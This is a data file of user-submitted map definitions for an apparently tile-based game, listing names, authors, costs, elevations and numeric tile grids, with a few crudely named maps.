maps.push({name="ElevateThoseTriggers",author="Niikos",id="#1657836583",direction="forward",cost=270,elevation=19,map=[0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,100,24,92,9,9,9,92,5,5,5,5,5,5,92,9,9,9,92,24,100,24,24,92,9,9,9,92,5,5,5,5,5,5,92,9,9,9,92,24,24,92,92,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,92,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,0,0,0,0,0,0,0,0,0,44,44,0,0,34,34,34,0,0,25,25,0,0,34,34,34,0,0,44,44,44,44,0,0,34,34,34,34,92,25,25,92,34,34,34,34,0,0,44,44,44,44,0,0,34,34,34,0,0,25,25,0,0,34,34,34,0,0,44,44,0,92,0,0,0,92,0,0,0,92,92,0,0,0,92,0,0,0,0,92,0,0,0,0,44,44,44,0,0,24,24,0,0,44,44,44,0,0,0,0,0,0,0,0,44,97,44,0,0,24,24,0,0,44,99,44,0,0,0,0,0,0,0,0,44,44,44,0,0,24,24,0,0,44,44,44,0,0,0,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,44,44,96,96,44,92,0,0,0,24,24,24,24,24,24,0,0,0,92,44,98,98,100,96,44,0,0,0,92,24,24,2,2,24,24,92,0,0,0,44,98,100]});
maps.push({name="RampofSerenity",author="Niikos",id="#1657928778",direction="forward",cost=324,elevation=15,map=[24,67,20,20,20,19,18,17,16,15,14,95,100,0,0,0,0,2,2,5,24,67,20,20,20,19,18,17,16,15,14,95,95,0,0,0,0,5,5,5,24,67,20,20,20,19,18,17,16,15,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,18,17,16,0,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,18,17,16,0,14,14,14,0,0,15,3,5,5,5,24,67,20,20,20,0,0,0,0,0,14,14,14,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,13,13,13,0,0,0,0,5,5,5,24,67,20,20,20,0,0,0,0,0,12,12,12,0,0,0,0,5,5,5,20,20,20,20,20,0,0,0,0,0,11,11,11,0,0,0,0,5,5,5,20,20,20,20,20,0,0,0,0,0,10,10,10,9,8,7,6,5,5,5,20,20,20,95,95,0,0,0,0,0,95,95,10,9,8,7,6,5,5,5,2,2,20,95,100,0,0,0,0,0,100,95,10,9,8,7,6,5,5,5]});
maps.push({name="Water Break",author="Niikos",id="#1657934909",direction="forward",cost=528,elevation=0,map=[24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24,24,24,67,67,67,67,24,67,67,14,14,67,67,67,67,67,67,67,67,67,24,24,67,14,14,14,14,24,14,14,14,14,14,14,14,14,14,14,14,67,24,24,67,14,14,14,14,14,24,94,14,14,14,14,14,14,14,14,14,67,24,24,67,14,14,24,14,14,14,24,14,14,14,14,14,14,14,14,14,67,24,24,24,14,14,14,24,14,14,14,24,93,14,14,14,14,14,14,14,67,24,24,67,24,14,14,14,24,14,95,14,24,14,14,14,14,14,14,14,67,24,24,67,14,24,14,14,14,24,14,14,14,24,24,24,24,14,14,14,24,24,24,67,14,14,24,14,14,14,24,14,14,14,14,14,14,95,14,24,67,24,24,67,14,14,14,24,14,95,14,24,14,14,14,14,14,14,24,14,67,24,24,67,14,14,95,14,24,14,14,14,24,24,24,24,24,24,14,14,67,24,24,67,14,24,14,14,14,24,14,14,14,14,14,14,14,14,14,14,67,24,24,67,14,14,24,14,14,14,24,14,14,14,14,14,14,14,14,14,67,24,24,67,14,14,14,24,14,14,14,24,24,24,24,24,24,24,14,14,67,24,24,67,14,14,14,14,24,14,14,14,14,14,14,14,14,24,14,14,67,24,24,67,14,14,14,14,14,24,24,24,24,14,14,14,14,24,14,14,67,24,24,67,14,14,14,14,14,14,14,14,24,14,14,14,14,14,14,14,67,24,24,67,14,14,14,14,14,14,14,14,24,14,14,14,14,14,14,14,67,24,24,67,67,67,67,67,67,67,14,14,24,67,67,67,67,67,67,67,67,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24,24]});
maps.push({name="pooldicklower",author="MoistNoodlez",id="#1657997774",direction="left",cost=747,elevation=-10,map=[97,9,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,9,97,9,9,66,66,66,66,66,66,66,66,66,66,66,66,19,19,66,66,9,9,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,9,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,9,9,9,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,76,76,76,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,76,76,66,66,66,76,76,66,66,66,66,66,1,1,66,66,66,66,66,66,76,76,66,66,66,76,76,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,1,9,9,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,2,96,9,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,9,9,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,9,97]});
maps.push({name="moldypenis",author="MoistNoodlez",id="#1657998788",direction="forward",cost=338,elevation=19,map=[0,0,1,2,2,1,76,76,76,76,76,0,0,0,0,0,0,0,0,0,0,1,97,1,45,45,1,0,0,0,76,0,0,0,0,0,0,0,0,0,0,1,45,1,45,45,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,46,76,46,1,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,1,46,46,76,1,0,0,1,1,0,0,0,0,1,0,0,0,0,0,0,1,47,47,46,1,0,0,0,1,1,0,0,0,1,0,0,1,1,0,0,0,1,47,47,1,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,1,48,48,1,1,0,1,1,50,1,55,55,55,1,60,1,1,0,0,0,1,49,49,1,1,1,1,50,50,50,1,55,1,60,60,60,1,1,0,0,1,50,50,1,1,45,45,1,1,1,1,1,1,1,1,1,64,1,0,0,1,51,51,1,1,45,1,1,59,60,60,61,61,97,1,1,64,1,0,0,1,52,52,52,1,45,1,58,58,1,60,61,61,62,62,1,1,1,0,0,1,53,53,53,1,1,1,57,58,1,60,61,76,76,62,63,1,1,0,0,1,54,54,54,54,1,56,57,58,59,1,61,61,76,62,63,1,0,1,0,1,55,55,55,76,55,56,57,58,1,60,61,61,62,62,63,1,0,1,1,1,1,55,55,76,76,56,57,58,59,60,61,61,1,63,63,1,0,0,1,1,1,1,76,56,76,56,57,58,59,60,61,61,1,64,63,1,0,1,0,1,1,97,57,57,76,76,76,76,59,60,1,1,64,64,1,1,0,0,1,1,1,1,58,58,58,58,58,58,59,1,96,96,96,64,1,0,0,1,0,1,0,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0]});
maps.push({name="Squeeze",author="tilgep",id="#1658015742",direction="forward",cost=148,elevation=-3,map=[0,0,0,0,0,0,124,2,2,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,0,1,124,124,0,0,0,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,124,124,124,0,0,0,0,0,0,0,0,0,0,0,124,124,124,124,124,124,124,124,124,124,0,0,0,0,0,0,0,0,0,1,124,124,124,124,124,124,124,124,124,124,1,0,0,0,0,0,0,0,0,1,121,121,121,121,121,121,121,121,121,121,1,0,0,0,0,0,0,0,0,0,121,121,121,121,121,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,121,121,121,121,121,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,121,121,121,121,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,121,121,1,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,121,0,1,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,121,0,1,121,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,121,0,1,0,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,121,0,1,0,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,1,121,0,1,0,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,1,121,121,1,0,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,1,0,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,121,1,121,121,121,121,0,0,0,0,0,0,0,0,0,0,0,0,0,0,121,121,121,2,2,121,0,0,0,0,0,0,0,0]});
maps.push({name="unhappytree",author="MoistNoodlez",id="#1658016808",direction="left",cost=547,elevation=-4,map=[0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,2,2,0,0,0,5,5,69,69,69,5,5,5,0,0,0,0,0,0,0,49,49,0,0,0,5,69,69,69,69,69,69,5,0,0,0,0,0,0,0,49,49,0,0,0,5,69,69,69,69,69,69,5,5,5,0,0,0,0,0,49,49,0,0,5,5,69,69,69,69,69,69,69,69,5,0,0,0,0,0,49,49,0,5,5,69,69,69,66,66,69,69,69,69,5,0,0,0,0,0,49,49,0,5,69,69,69,66,66,69,5,97,69,69,5,0,0,0,0,0,49,49,49,5,69,69,5,5,66,69,5,69,69,69,69,66,49,49,49,49,49,49,49,5,69,69,5,5,69,5,5,69,69,69,69,66,49,49,49,49,49,49,49,5,69,69,69,69,69,5,69,69,69,69,69,66,49,49,49,49,49,49,49,5,69,69,69,69,69,5,69,69,69,69,69,66,49,49,49,49,49,49,49,1,69,69,5,5,69,5,5,69,69,69,5,0,0,0,0,49,49,49,49,2,96,66,5,5,66,66,5,5,69,69,5,5,0,0,0,0,0,49,49,2,5,69,69,69,69,66,69,69,69,69,69,5,5,0,0,0,0,0,49,1,1,69,69,69,69,69,69,69,69,69,69,69,5,0,0,0,0,0,0,0,5,69,69,69,69,69,69,69,69,69,69,69,5,0,0,0,0,0,0,0,5,5,69,69,69,69,69,69,69,69,69,5,5,0,0,0,0,0,0,0,0,5,5,69,69,69,69,69,69,69,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,69,69,69,69,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0]});
maps.push({name="MY AWESOME MAP",author="tilgep",id="#1658016819",direction="forward",cost=89,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,15,14,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,24,16,13,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,24,17,12,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,24,18,11,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,24,19,10,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,23,20,9,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,22,21,8,7,6,5,5,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="present",author="MoistNoodlez",id="#1658017579",direction="left",cost=829,elevation=0,map=[0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,0,0,0,1,40,40,40,40,40,40,127,127,40,40,40,40,40,40,40,1,0,0,0,1,40,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,0,0,0,1,40,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,0,0,0,1,40,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,40,0,0,1,97,127,76,76,76,76,127,127,76,76,76,76,76,76,40,1,131,0,0,1,76,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,131,131,0,1,76,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,40,131,131,1,76,76,76,76,76,76,127,127,76,76,76,76,76,76,40,1,0,131,131,96,128,128,128,128,128,128,128,128,128,128,128,128,128,128,40,1,0,131,131,96,128,128,128,128,128,128,128,128,128,128,128,128,128,128,40,1,0,131,131,1,76,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,40,131,0,1,76,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,40,40,0,1,76,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,2,0,0,1,97,126,76,76,76,76,126,126,76,76,76,76,76,76,40,1,2,0,0,1,40,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,0,0,0,1,40,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,0,0,0,1,40,76,76,76,76,76,126,126,76,76,76,76,76,76,40,1,0,0,0,1,40,40,40,40,40,40,126,126,40,40,40,40,40,40,40,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="TicTacNo",author="Niikos",id="#1658020249",direction="forward",cost=562,elevation=0,map=[2,2,39,39,39,1,1,1,39,39,39,39,39,95,39,39,39,39,39,39,90,39,39,39,90,39,1,39,76,76,76,76,39,1,39,91,91,91,91,39,39,90,39,90,39,39,1,39,76,39,39,76,39,1,39,91,39,39,91,39,39,39,90,39,39,39,1,39,76,39,39,76,39,1,39,91,39,39,91,39,39,90,39,90,39,39,1,39,76,76,76,76,39,1,39,91,91,91,91,39,90,39,39,39,90,95,1,39,39,39,39,39,39,1,39,39,39,39,39,39,1,1,1,1,1,95,1,95,1,1,1,1,1,1,1,1,1,1,1,95,1,39,39,39,39,39,1,39,39,39,39,39,39,1,66,39,39,39,66,39,39,92,92,92,92,39,1,39,91,39,39,39,91,1,39,66,39,66,39,39,39,92,39,39,92,39,1,39,39,91,39,91,39,1,39,39,66,39,39,39,39,92,39,39,92,39,1,39,39,39,91,39,39,1,39,66,39,66,39,39,39,92,92,92,92,39,1,39,39,91,39,91,39,1,66,39,39,39,66,39,39,39,39,39,39,39,1,39,91,39,39,39,91,1,39,39,39,39,39,1,95,1,1,1,1,1,1,1,1,1,1,1,95,1,95,1,1,1,1,1,39,39,39,39,39,39,1,39,39,39,39,39,39,1,39,39,39,39,39,1,39,65,39,39,39,65,1,39,75,75,75,75,39,1,39,65,65,65,65,39,39,39,65,39,65,39,1,39,75,39,39,75,39,1,39,65,39,39,65,39,39,39,39,65,39,39,1,39,75,39,39,75,39,1,39,65,39,39,65,39,39,39,65,39,65,39,1,39,75,75,75,75,39,1,39,65,65,65,65,39,39,65,39,39,39,65,95,39,39,39,39,39,1,1,1,39,39,39,2,2]});
maps.push({name="madman",author="MoistNoodlez",id="#1658020540",direction="right",cost=373,elevation=0,map=[0,0,2,2,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,59,59,59,59,59,59,14,14,14,0,0,0,0,0,0,14,14,14,14,59,59,59,59,59,59,59,59,59,14,14,0,0,0,0,0,14,14,14,59,59,59,59,59,59,59,59,59,59,59,14,14,0,0,0,14,14,92,59,59,59,5,5,59,59,59,59,59,59,59,59,14,0,0,0,14,14,92,59,59,59,5,5,5,5,5,59,59,59,59,59,59,7,0,0,14,14,59,59,59,59,59,5,97,0,5,59,59,59,59,59,59,7,7,0,14,14,59,59,59,59,59,5,5,0,5,59,59,59,59,59,59,59,7,7,14,59,59,59,59,59,59,92,5,5,5,59,5,5,59,7,7,7,86,7,14,59,59,59,59,59,59,59,59,59,59,59,59,5,59,59,7,7,7,86,14,59,59,59,59,5,5,5,5,59,59,59,92,5,59,59,7,0,7,86,14,59,59,59,5,5,97,0,5,59,59,59,5,5,5,59,7,7,0,86,14,59,59,5,5,5,5,0,5,59,59,92,5,5,5,59,7,0,7,86,14,59,59,5,59,92,5,5,5,59,59,5,5,5,59,59,7,7,0,86,14,59,5,59,59,59,59,59,59,59,59,59,59,59,59,7,7,0,9,9,14,14,59,59,59,59,59,59,59,59,59,59,59,92,92,7,7,9,9,11,0,14,59,59,59,59,59,59,59,59,7,7,7,7,7,7,7,9,11,96,0,0,7,7,7,7,7,7,7,7,7,0,0,0,76,76,76,76,96,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,76,76,76,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,76,76]});
maps.push({name="downandout",author="MoistNoodlez",id="#1658028517",direction="right",cost=384,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,5,6,7,6,7,8,9,9,8,7,6,7,6,5,0,0,0,0,0,0,5,6,7,6,7,8,9,9,8,7,6,7,6,5,0,0,0,0,0,0,5,6,7,6,7,8,8,8,8,7,6,7,6,5,0,0,0,0,0,0,5,6,7,7,7,7,7,7,7,7,7,7,6,5,0,0,0,0,0,0,5,6,6,6,6,6,6,6,6,6,6,6,6,5,0,0,0,0,0,0,95,95,95,95,95,95,95,95,95,95,95,95,95,95,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,2,0,125,125,125,125,125,125,125,125,125,125,125,125,125,125,0,0,0,0,2,0,6,7,8,9,9,9,9,9,9,9,9,8,7,6,0,0,0,0,19,0,125,125,125,125,125,125,125,125,125,125,125,125,125,125,0,0,0,0,19,0,10,11,12,13,14,14,14,14,14,14,13,12,11,10,0,0,0,0,95,0,125,125,125,125,125,125,125,125,125,125,125,125,125,125,0,0,0,0,95,0,15,16,17,18,19,19,19,19,19,19,18,17,16,15,0,0,0,0,19,0,125,125,125,125,125,125,125,125,125,125,125,125,125,125,0,0,0,0,19,0,20,21,22,23,24,24,24,24,24,24,23,22,21,20,22,66,66,66,18]});
maps.push({name="BanHammer",author="MoistNoodlez",id="#1658035302",direction="right",cost=407,elevation=-2,map=[0,0,9,9,9,9,2,2,9,9,9,9,9,0,0,0,0,0,0,0,0,0,9,11,11,11,11,11,11,11,11,11,9,0,0,0,0,0,0,0,0,0,9,13,13,13,13,13,13,13,13,13,9,0,0,0,0,0,0,0,0,0,9,76,76,76,76,76,76,76,14,14,9,0,0,0,0,0,0,0,0,0,9,76,14,14,76,14,14,76,14,14,9,0,0,0,0,0,0,0,0,0,9,76,97,15,76,15,15,76,15,15,9,0,0,0,0,0,0,0,0,0,9,16,76,76,16,76,76,16,16,16,9,0,0,0,0,0,0,0,0,0,9,16,16,16,16,16,16,16,16,9,9,0,0,0,0,96,96,0,0,0,9,17,17,76,76,76,76,76,17,9,11,13,91,91,11,9,96,1,48,48,9,17,76,18,18,76,17,17,17,9,11,13,91,91,11,9,96,1,48,48,9,18,76,97,19,76,18,18,18,9,11,13,91,91,11,9,96,2,48,48,9,19,19,76,76,76,76,76,19,9,11,13,91,91,11,9,96,2,97,48,9,19,19,19,19,19,19,19,19,9,11,13,105,105,11,9,96,1,0,0,9,76,76,76,76,76,76,76,20,9,9,0,0,0,0,0,96,0,0,0,9,20,76,76,97,20,20,20,20,20,9,0,0,0,0,0,96,0,0,0,9,20,20,76,76,20,20,20,20,20,9,0,0,0,0,96,0,96,0,0,9,22,22,97,76,76,22,22,22,22,9,0,0,0,0,0,0,0,0,0,9,76,76,76,76,76,76,76,22,22,9,0,0,0,0,0,0,0,0,0,9,23,23,23,23,23,23,23,23,23,9,0,0,0,0,0,0,0,0,0,9,9,9,9,97,9,9,9,9,9,9,0,0,0,0,0,0,0]});
maps.push({name="airhockey",author="MoistNoodlez",id="#1658066479",direction="forward",cost=232,elevation=9,map=[0,5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,0,5,0,0,0,0,135,0,0,0,0,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,5,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,5,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,0,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,5,0,0,0,135,0,0,0,0,5,0,5,76,76,0,0,135,0,0,0,5,0,0,0,135,0,0,76,76,5,0,5,0,76,0,0,135,0,0,0,0,0,0,0,135,0,0,76,0,5,0,5,0,76,0,0,135,0,0,5,5,5,0,0,135,0,0,76,0,5,0,5,0,76,0,0,135,0,5,0,0,0,5,0,135,0,0,76,0,5,0,97,0,76,0,0,135,0,5,0,0,0,5,0,135,0,0,76,0,97,0,5,0,76,0,0,135,0,0,5,5,5,0,0,135,0,0,76,0,5,0,5,0,76,0,0,135,0,0,0,0,0,0,0,135,0,0,76,0,5,0,5,76,76,0,0,135,0,0,0,5,0,0,0,135,0,0,76,76,5,0,5,0,0,0,0,135,0,0,0,5,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,0,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,5,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,96,0,0,0,135,0,0,0,0,5,0,5,0,0,0,0,135,0,0,0,0,0,0,0,135,0,0,0,0,5,0,5,5,5,5,5,5,5,5,96,2,2,96,5,5,5,5,5,5,5]});
maps.push({name="pizza",author="MoistNoodlez",id="#1658067507",direction="right",cost=307,elevation=11,map=[0,0,0,0,0,2,2,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,92,47,47,6,6,6,0,0,0,0,0,0,0,0,0,0,0,6,6,47,47,47,49,6,92,38,6,0,0,0,0,0,0,0,0,0,0,6,47,47,49,49,47,6,38,38,38,6,0,0,0,0,0,0,0,0,6,6,47,49,49,47,6,6,38,38,38,38,6,0,0,0,0,0,0,0,6,47,47,49,49,47,6,92,38,38,38,38,38,6,0,0,0,0,0,6,47,47,49,49,49,6,6,38,38,38,38,38,38,92,0,0,0,0,0,6,47,49,49,49,49,6,38,5,38,76,76,38,38,38,6,0,0,0,0,6,49,49,49,49,47,38,5,38,38,76,76,38,38,38,92,6,5,0,0,6,49,49,49,47,6,92,5,0,5,38,38,38,38,38,38,38,92,0,0,6,49,49,47,6,6,38,38,5,5,38,38,38,38,38,5,38,6,0,0,6,49,47,6,6,38,5,38,38,38,38,38,38,38,38,5,38,92,6,0,6,6,6,92,38,5,38,38,76,76,38,38,38,38,38,38,5,38,6,0,0,0,0,6,6,5,0,5,76,76,38,38,76,76,38,38,5,38,6,6,0,0,0,0,6,5,5,5,38,38,38,38,76,76,38,38,5,76,38,6,0,0,0,0,0,0,5,5,6,92,38,38,38,38,38,38,5,76,38,2,0,0,0,0,0,0,0,0,0,6,6,6,6,92,38,38,38,38,38,2,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="leftandright",author="MoistNoodlez",id="#1658070670",direction="forward",cost=220,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,2,2,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,0,0,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,131,131,9,0,0,0,0,0,9,9,9,9,9,9,9,131,131,9,9,9,131,131,9,0,0,0,0,9,131,135,135,131,135,135,131,135,135,131,135,131,135,135,0,0,0,0,0,0,135,135,135,131,135,135,131,135,135,131,135,131,135,135,0,0,0,0,0,0,135,135,131,9,0,0,9,9,9,9,0,9,9,9,9,0,0,0,0,9,131,131,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,131,131,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,131,131,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,131,131,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,9,9,3,96,19,19,0,0,0,0,0,0,0,0,0,0,0,97,19,19,3,3,19,96,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="russianflag",author="MoistNoodlez",id="#1658071414",direction="left",cost=583,elevation=0,map=[0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,74,74,74,74,74,74,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,24,74,74,74,24,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,74,74,24,74,74,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,24,74,74,74,24,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,74,74,24,74,74,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,24,74,74,74,24,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,74,74,24,74,74,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,24,74,74,74,24,74,24,76,24,76,24,76,0,0,0,0,0,0,0,74,74,74,74,74,74,74,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,0,0,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,24,96,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,2,96,76,24,76,24,76,24,76,24,76,24,76,24,76,0,0,0,0,0,2,96,76,24,76,24,76,24,76,24,76,24,76,24,76,24,97,0,0,0,24,96,76,24,76,24,76,24,76,24,76,24,76,24,76,24,0,0,0,0]});
